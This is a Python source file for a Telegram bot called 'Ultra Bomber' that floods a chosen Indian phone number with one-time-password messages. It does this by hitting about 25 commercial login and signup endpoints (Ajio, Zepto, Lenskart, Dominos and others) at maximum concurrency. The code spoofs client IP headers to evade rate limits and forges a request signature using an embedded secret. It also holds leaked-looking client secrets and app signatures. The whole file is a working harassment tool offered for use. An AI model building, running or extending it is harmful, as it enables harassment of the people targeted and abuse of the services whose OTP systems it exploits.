import os
import sys
import time
import asyncio
import logging
import random
import uuid
import hmac
import hashlib
import base64
import json
from datetime import datetime
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "") 
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))

CONCURRENCY     = 100  # MAX SPEED
DELAY           = 0    # NO DELAY
REQUEST_TIMEOUT = 4
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  BOMBITUP EXTENDED APIS (IndApi.kt se nikali hui)
# =========================================================================
def build_endpoints():
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    
    E = []

    # 1. Ajio (Login & Signup)
    E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"firstName":"","login":"","genderType":"","mobileNumber":"{t}","r92niPhiXyTfhKKzMV5xjM8W1cAd8GN13p":"","requestType":"SENDOTP","newDesign":false}'})
    
    # 2. BigBasket Daily
    E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14","X-Caller":"bb-daily","X-Channel":"BB-Daily-Android","X-Project":": bb-wallet","X-Entry-Context-Id":"4","X-Entry-Context":"BBDaily"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})

    # 3. Aakash Institute
    E.append({"name":"Aakash","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_psid":"{t}","mobile_number":"","activity_type":"aakash-myadmission-signup","webengageData":{"profile":"student","whatsapp_opt_in":false,"method":"mobile"}}'})

    # 4. ConfirmTkt
    E.append({"name":"ConfirmTkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&retry=false&hashOtp=true&fireBaseSMSvendor=karix&locale=en&channel=Android&appVersion=463&session={uuid}","headers":{"User-Agent":"okhttp/5.0.0-alpha.3"},"data":None})

    # 5. Housing.com (GraphQL)
    E.append({"name":"Housing","method":"POST","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"query":"mutation($phone: String) { sendOtp(phone: $phone, otpLength: 4, userAgent: \\"Mozilla/5.0\\") { success message } }","variables":{"phone":"{t}"}}'})

    # 6. Jar App
    E.append({"name":"JarApp","method":"POST","url":"https://prod.myjar.app/v3/api/auth/requestOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app-signature":"28f0a03fa7c891e812954517ca3d242e5e352018a707a42a9f2d06a9e1e0e674","package-name":"com.jar.app"},"data":'{"hasExperianConsent":true,"phoneNumber":"{t}","countryCode":"91"}'})

    # 7. Max Fashion
    E.append({"name":"MaxFashion","method":"POST","url":"https://www.maxfashion.in/landmarkshopscommercews/in/oauth/token","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"appId=ANDROID&client_id=mobile_android&client_secret=F7LBBekbehGRQWpROIKJq&grant_type=client_credentials"})

    # 8. My11Circle
    E.append({"name":"My11Circle","method":"POST","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mobile":"{t}","geoLocState":null,"state":null,"nae":{"utmParams":{"useragent":"Android","apk_v":"92","appVersion":"5.0.1"}},"whatsappAlerts":false}'})

    # 9. Nykaa Fashion
    E.append({"name":"NykaaFashion","method":"POST","url":"https://www.nykaafashion.com/grahak-service/api/v1/auth/login/init?loginMethod=MOBILE_OTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"platform":"Android"},"data":'{"mobileOrEmail":"{t}"}'})

    # 10. TVS Motor
    E.append({"name":"TVSMotor","method":"POST","url":"https://tvsconnectapi.tvsmotor.com/api/v3/UserLogin/Loginv3","headers":{"Content-Type":"application/json","User-Agent":"okhttp/5.0.0-alpha.2"},"data":'{"IsSuppressOTP":false,"MobileNumber":"{t}","otpLength":6}'})

    # 11. Zepto Signup
    E.append({"name":"ZeptoSignup","method":"POST","url":"https://api.zepto.co.in/api/v1/user/customer/signup/","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.12.0"},"data":'{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})

    # 12. ZestMoney
    E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})

    # 13. Country Delight (HMAC Signature Logic added in fire_endpoint)
    E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","channel_name":null,"mode":"SMS"}', "hmac": True})

    # 14. Eatsure / Faasos (Special Signature)
    E.append({"name":"Eatsure","method":"POST","url":"https://thanos.faasos.io/v3/customer/generate_otp.json?app_version=10388&client_os=eatsure_android","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-key-id":"!M<R[(B062"},"data":'{"phone_number":"{t}","country_code":"IND","dialing_code":"+91","is_new_customer":false,"communication_channel":"sms"}'})

    # 15. Meesho (OTPLess Headless)
    E.append({"name":"MeeshoOtpless","method":"POST","url":"https://user-auth.otpless.app/v3/lp/user/transaction/intent/1097ca1e-80e3-4de8-8f14-213e5bb22c93","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.0"},"data":'{"selectedCountryCode":"91","mobile":"91{t}","appId":"XN07RN1IQC548C9YK5I4","packageName":"com.meesho.supply"}'})

    # ==========================================
    # 16. PURANI TSUNAMI APIS (Speed ke liye thodi si)
    # ==========================================
    E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Khatabook","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Apna","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"JioSaavn","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Dominos","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Blinkit","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})

    return E

ENDPOINTS = build_endpoints()

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    ts = str(int(time.time() * 1000))
    u_id = uuid.uuid4().hex
    url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
    
    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)

    # Special HMAC logic for Country Delight
    if ep.get("hmac"):
        secret = bytes.fromhex("4174697368204167726177616c20436f756e7472792044656c69676874")
        msg = f"{ts}|{target}|SMS".encode('utf-8')
        sig = base64.b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).decode('utf-8')
        headers["X-Timestamp"] = ts
        headers["X-Signature"] = sig

    # Special Signature logic for Eatsure
    if ep["name"] == "Eatsure":
        random_bytes = os.urandom(32)
        sig = base64.b64encode(random_bytes).decode('utf-8')
        headers["x-timestamp"] = ts
        headers["x-signature"] = sig

    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return resp.status in (200, 201, 202)
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== BUTTON HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("?? START ULTRA BOMBER ??", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "?? **ULTRA BOMBER ACTIVATED** ??\n\n"
        "Welcome to the most powerful SMS & Call Bomber.\n"
        "Click the button below to start destroying."
    )
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("?? Send target number (10 digits, no +91):")
    
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("?? **STOPPING...** Session Destroyed.", parse_mode="Markdown")

# ================== TEXT HANDLER ==================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    
    if not s or s.get("state") != "awaiting_target":
        return
        
    if not is_valid_target(text):
        await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
    
    keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"?? **ULTRA BOMBER ACTIVATED** ??\n\n"
        f"?? **Target:** `{text}`\n"
        f"? **Speed:** MAXIMUM\n"
        f"? **Duration:** UNTIL STOPPED\n"
        f"?? **Calls:** ACTIVE\n"
        f"?? **WhatsApp:** ACTIVE\n"
        f"?? **SMS:** ACTIVE\n"
        f"?? **Bomber:** ACTIVE\n\n"
        f"?? **EXTREME DESTRUCTION STARTED!**\n"
        f"Target phone will receive non-stop messages.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    asyncio.create_task(run_bombing(uid, s))

# ================== BOMBING LOGIC ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    
    try:
        while s.get("running"):
            s["round"] += 1
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            
            if ok == 0:
                await asyncio.sleep(0.1) 
            else:
                if DELAY > 0:
                    await asyncio.sleep(DELAY)
                
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "?? Stopped by you" if s.get("cancelled") else "? Done"
        await bot.send_message(
            uid, 
            f"{reason}!\n\n"
            f"?? **Report for** `{target}`\n"
            f"?? Total Sent: *{sent}*\n"
            f"? Duration: {elapsed}s", 
            parse_mode="Markdown"
        )
    except Exception:
        pass

# ================== WEBHOOK & STARLETTE ==================
async def health(request): return PlainTextResponse("OK", status_code=200)
async def root(request): return PlainTextResponse("Ultra Bomber is Live ??")

async def startup():
    global telegram_app
    if not WEBHOOK_URL: return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"
    
    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"? Webhook set")

async def webhook(request):
    if telegram_app is None: return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e: logger.exception(f"webhook error: {e}")
    return Response("ok")

async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed: await _http_session.close()
    if telegram_app: await telegram_app.stop(); await telegram_app.shutdown()

def create_app() -> Starlette:
    routes = [Route("/", root), Route("/health", health), Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"])]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])

app = create_app()

if __name__ == "__main__":
    if not BOT_TOKEN: sys.exit(1)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
